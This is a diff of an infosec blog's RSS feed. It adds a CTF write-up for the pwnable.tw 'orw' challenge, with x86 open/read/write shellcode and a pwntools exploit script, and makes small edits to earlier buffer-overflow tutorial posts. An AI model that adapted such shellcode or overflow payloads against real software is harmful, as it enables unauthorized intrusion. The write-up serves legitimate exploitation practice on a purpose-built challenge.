@@ -6,7 +6,142 @@
     <description>Recent content in pwn on Yet, another infosec blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 10 Jan 2022 09:30:00 +1345</lastBuildDate><atom:link href="https://legiahuyy.github.io/blog/en/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 07 May 2022 09:30:00 +1345</lastBuildDate><atom:link href="https://legiahuyy.github.io/blog/en/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pwnable.tw - orw [KCSC]</title>
+      <link>https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/</link>
+      <pubDate>Sat, 07 May 2022 09:30:00 +1345</pubDate>
+      
+      <guid>https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/</guid>
+      <description>&lt;p&gt;Let&amp;rsquo;s have a quick and succinct write-up for &lt;strong&gt;orw&lt;/strong&gt; - a challenge at &lt;a href=&#34;&#34;&gt;pwnable.tw&lt;/a&gt;.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Let&amp;rsquo;s have a quick and succinct write-up for &lt;strong&gt;orw&lt;/strong&gt; - a challenge at &lt;a href=&#34;&#34;&gt;pwnable.tw&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_20-07.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;footprinting&#34;&gt;Footprinting&lt;/h2&gt;
+&lt;p&gt;Initially, we want to check the file for any notable properties (PIE, Canary, RELRO, etc.).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-24.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Based on the output above, there are no protection bits enabled within the binary (except for canary but it does not interfere with our payload afterwards) and therefore it is presumably believed to be quite simple as expected for a 100pts challenge.&lt;/p&gt;
+&lt;p&gt;For now, we shall have a look into the disassembly code of &lt;code&gt;orw&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;What the program does is rather straightforward, as it:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;calls &lt;code&gt;orw_seccomp&lt;/code&gt; which basically allows only &lt;code&gt;SYS_open&lt;/code&gt;, &lt;code&gt;SYS_read&lt;/code&gt; and &lt;code&gt;SYS_write&lt;/code&gt; to be executed thus limited our capability of calling low hanging fruit syscalls like &lt;code&gt;execve&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt; or such&lt;/li&gt;
+&lt;li&gt;reads input from STDIN (&lt;code&gt;SYS_read&lt;/code&gt; with 200 bytes limit) and executes whatever it is as shellcode&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;That being said, the author simply asks us to practice writing assembly and interacting with given syscalls.&lt;/p&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;According to what we have discussed, our shellcode needs to call &lt;code&gt;SYS_open&lt;/code&gt; to open the flag at &lt;code&gt;/home/orw/flag&lt;/code&gt;, then reads the content therein with &lt;code&gt;SYS_read&lt;/code&gt; and finally pipe it to STDOUT using &lt;code&gt;SYS_write&lt;/code&gt;. Keep in mind that syscalls have their own dedicated &lt;em&gt;ID&lt;/em&gt;, herein &lt;code&gt;0x5&lt;/code&gt;, &lt;code&gt;0x3&lt;/code&gt;, &lt;code&gt;0x4&lt;/code&gt; for &lt;code&gt;open&lt;/code&gt;, &lt;code&gt;read&lt;/code&gt; and &lt;code&gt;write&lt;/code&gt;, respectively.&lt;/p&gt;
+&lt;p&gt;You can read more about Linux syscalls and their respective assembly &lt;a href=&#34;https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_22-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To call a syscall, simply push its ID into &lt;code&gt;EAX&lt;/code&gt; then ask &lt;code&gt;INT&lt;/code&gt; to execute it.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov eax, 0x1	; 0x1 - SYS_exit
+int 0x80		; call it
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;sys_open---0x5&#34;&gt;SYS_open - 0x5&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pathname, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; flags, mode_t mode);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As demonstrated in the table and the syntax listed, &lt;code&gt;SYS_open&lt;/code&gt; takes &lt;code&gt;ebx&lt;/code&gt; as its filename, &lt;code&gt;ecx&lt;/code&gt; as open access mode and &lt;code&gt;edx&lt;/code&gt; as file permission. We thus need:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EBX&lt;/code&gt; holds the value of &lt;code&gt;/home/orw/flag&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ECX&lt;/code&gt; could be &lt;code&gt;0&lt;/code&gt; (&lt;code&gt;O_RDONLY&lt;/code&gt; flag)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EDX&lt;/code&gt; is not necessary since it is a optional argument, we should leave it as &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Our shellcode for this syscall shall as follows:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;push 0x6761		; ag
+push 0x6c662f77 ; w/fl
+push 0x726f2f65	; e/or
+push 0x6d6f682f	; /hom
+mov ebx, esp	; ESP now has the path /home/orw/flag
+xor ecx, ecx	; O_RDONLY
+xor edx, edx	; NULL
+mov eax, 0x5 	; SYS_open(ebp, ecx, edx)
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; It is not feasible to push the whole string &lt;code&gt;/home/orw/flag&lt;/code&gt; but a 8-byte value onto the stack at once since the program is speaking x32 and that is the reason why we have to divide the string into four separate parts. Follow &lt;a href=&#34;https://c9x.me/x86/html/file_module_x86_id_269.html&#34;&gt;this link&lt;/a&gt; for more information about PUSH instruction.&lt;/p&gt;
+&lt;p&gt;You can convert the string in reverse using this recipe in &lt;a href=&#34;https://gchq.github.io/CyberChef/#recipe=Reverse(&#39;Character&#39;)To_Hex(&#39;None&#39;,8)&amp;amp;input=L2hvbQ&#34;&gt;CyberChef&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;sys_read---0x3&#34;&gt;SYS_read - 0x3&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, size_t count);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Follows the table and &lt;code&gt;read&lt;/code&gt;&amp;rsquo;s syntax:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EBX&lt;/code&gt; is now our file handle returned from &lt;code&gt;SYS_open&lt;/code&gt; and stored in &lt;code&gt;EAX&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ECX&lt;/code&gt; holds the buffer for the flag, it could point to any string register dubbed &lt;code&gt;ESI&lt;/code&gt;, &lt;code&gt;EDI&lt;/code&gt; or even &lt;code&gt;ESP&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EDX&lt;/code&gt; is the maximum bytes our buffer shall have, &lt;code&gt;0x50&lt;/code&gt; should be enough for the flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And we have the shellcode for &lt;code&gt;SYS_read&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; ...
+mov ebx, eax	; eax has the handle of our file
+mov ecx, esp	; ecx now points to esp and uses it as the buffer
+mov edx, 0x50	; ... of 0x50 bytes in size
+mov eax, 0x3	; SYS_read(ebx, ecx, edx)
+int 0x80			
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;sys_write---0x4&#34;&gt;SYS_write - 0x4&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#a6e22e&#34;&gt;write&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, size_t count);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same with those two above, we adhere to the table and its syntax:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EBX&lt;/code&gt; is file descriptor which indicates where the program would write and the register&amp;rsquo;s value should be &lt;code&gt;1&lt;/code&gt; - pipe directly to STDOUT&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ECX&lt;/code&gt; needs to point to our flag and it is currently in &lt;code&gt;ESP&lt;/code&gt; so we shall have it as that&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EDX&lt;/code&gt; is the number of bytes to be written which returned from &lt;code&gt;SYS_read&lt;/code&gt;, therefore it should be &lt;code&gt;EDX -&amp;gt; EAX&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Our shellcode:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; ...
+mov edx, eax	; byte_written = eax
+mov ebx, 0x1	; stdout
+mov ecx, esp	; flag&#39;s buffer
+mov eax, 0x4	; SYS_write
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;solvepy&#34;&gt;Solve.py&lt;/h2&gt;
+&lt;p&gt;In this final step, gather them all in one place - &lt;code&gt;solve.py&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./orw&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;#p = process([elf.path])&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chall.pwnable.tw&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10001&lt;/span&gt;)
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; asm(
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x6761
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x6c662f77
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x726f2f65
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x6d6f682f
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ebx, esp
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        xor ecx, ecx
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        xor edx, edx
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov eax, 0x5
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ebx, eax
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ecx, esp
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov edx, 0x50
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov eax, 0x3
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ecx, esp
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov edx, eax
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov ebx, 0x1
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        mov eax, 0x4
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        push 0x1
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        pop eax
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+)
+
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Payload size: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;len(payload)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# just to make sure our payload won&amp;#39;t exceed 200 bytes limit&lt;/span&gt;
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The script shows that our payload has the size of 70 bytes and we have the flag subsequently. It is still worth mentioning that we can reduce the size of the payload by replacing &lt;code&gt;mov&lt;/code&gt;  with &lt;code&gt;push; pop&lt;/code&gt; instruction since the latter two only consist of 3 bytes in total whereas &lt;code&gt;mov&lt;/code&gt; is of 5-bytes itself.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-28.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</content>
+    </item>
+    
+    <item>
+      <title>PWN Journey 3: More format string and ret2dlresolve</title>
+      <link>https://legiahuyy.github.io/blog/en/posts/pwns-3/</link>
+      <pubDate>Mon, 10 Jan 2022 09:30:00 +1345</pubDate>
+      
+      <guid>https://legiahuyy.github.io/blog/en/posts/pwns-3/</guid>
+      <description>&lt;p&gt;This post will demonstrate how we can abuse more of the format string vulnerability in different ways, or by a set of special format specifiers, precisely. Likewise, we will contemplate a new technique called &lt;strong&gt;ret2dlresolve&lt;/strong&gt; and have some exercise regarding.&lt;/p&gt;</description>
+      <content>&lt;p&gt;This post will demonstrate how we can abuse more of the format string vulnerability in different ways, or by a set of special format specifiers, precisely. Likewise, we will contemplate a new technique called &lt;strong&gt;ret2dlresolve&lt;/strong&gt; and have some exercise regarding.&lt;/p&gt;</content>
+    </item>
+    
     <item>
       <title>PWN Journey: Part 2</title>
       <link>https://legiahuyy.github.io/blog/en/posts/pwns-2/</link>
@@ -451,7 +586,7 @@ relro    partial
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;and &lt;code&gt;win&lt;/code&gt;:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;You might be wondering why there is no canary check in either the prologue or epilogue of these two &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt; functions. This happens since the two simply do not inquire about the stack or have any particularly tasks that need the sentinel values.&lt;/p&gt;
+&lt;p&gt;You might be wondering why there is no canary check in either the prologue or epilogue of these two &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt; functions. This happens since the two simply do not inquire about the stack or have any particular tasks that need the sentinel values.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;login&lt;/code&gt;, however, is different as it is plain to see the canary is being stored at &lt;code&gt;rbp-0x8&lt;/code&gt;:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x7f492b935050]&amp;gt; pdf @ sym.login
             ; CALL XREF from main @ 0x56279e188182
@@ -732,11 +867,11 @@ print(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean())
 &lt;p&gt;Let me introduce you to the &lt;strong&gt;De Bruijn Sequence&lt;/strong&gt;, which contains no string of &lt;code&gt;n&lt;/code&gt; character repeated. The sequence can either be created by yourself or any available auxiliaries (e.g., &lt;code&gt;ragg2&lt;/code&gt;, &lt;code&gt;cyclic&lt;/code&gt;, &lt;code&gt;pattern_create (gdb)&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The reason why a &lt;em&gt;random&lt;/em&gt; gibberish string is able to help us to find the padding is that while you are filling the stack with the sequence, &lt;code&gt;RIP&lt;/code&gt; (and even others) could already be overwritten, thereby leading to a SIGSEGV and crashing the execution. With that, the particular position of these so-called &lt;em&gt;random bytes&lt;/em&gt; in &lt;code&gt;RIP&lt;/code&gt; now is that of our padding length in the sequence pattern.&lt;/p&gt;
-&lt;p&gt;Next, we want to load the binary in our debugger and find the padding length.&lt;/p&gt;
+&lt;p&gt;Next, we want to load the binary in our debugger and find the padding length&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-40.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;and our registers table:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The &lt;code&gt;wopO `dr rip` &lt;/code&gt; command simply finds the given value in &lt;code&gt;RIP&lt;/code&gt; into a De Bruijn sequence at a current offset or you can just type &lt;code&gt;wopO 0x41415441&lt;/code&gt; instead and it shows us our padding size, 56.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;wopO `dr rip` &lt;/code&gt; command simply finds the given value in &lt;code&gt;RIP&lt;/code&gt; into a De Bruijn sequence at a current offset or you can just type &lt;code&gt;wopO 0x41415441&lt;/code&gt; instead and it will show us our same padding size, 56.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PADDING (56 bytes) + FLAG_ADDR (RIP)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have one last factor, the address of &lt;code&gt;flag()&lt;/code&gt; which is &lt;code&gt;0x0040116b&lt;/code&gt;. To get it, simply type &lt;code&gt;afl&lt;/code&gt; for a list of functions and their addresses.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x41415441]&amp;gt; afl
